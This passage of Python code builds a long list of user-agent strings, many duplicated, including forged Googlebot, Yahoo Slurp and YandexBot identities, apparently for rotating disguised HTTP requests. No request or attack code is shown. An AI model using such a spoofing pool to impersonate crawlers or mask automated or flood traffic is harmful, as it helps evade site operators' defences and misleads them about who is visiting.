                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
                                    	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36')
                                    	headers_useragents.append('Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36')
                                    	headers_useragents.append('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5')
                                    	headers_useragents.append('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0')
                                    	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0')
                                    	headers_useragents.append('Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0')
                                    	headers_useragents.append('Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0')
                                    	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0')
                                    	headers_useragents.append('Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)')
                                    	headers_useragents.append('Mozilla/5.0(compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)')
                                    	headers_useragents.append('Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+')
                                    	headers_useragents.append('Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+')
                                    	headers_useragents.append('Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+')
                                    	headers_useragents.append('Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25')
                                    	headers_useragents.append('Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36')
                                    	headers_useragents.append('Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36')
                                    	headers_useragents.append('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5')
                                    	headers_useragents.append('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0')
                                    	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0')
                                    	headers_useragents.append('Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0')
                                    	headers_useragents.append('Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0')
                                    	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0')
                                    	headers_useragents.append('Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)')
                                    	headers_useragents.append('Mozilla/5.0(compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)')
                                    	headers_useragents.append('Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+')
                                    	headers_useragents.append('Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+')
                                    	headers_useragents.append('Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+')
                                    	headers_useragents.append('Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25')
                                    	headers_useragents.append('Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
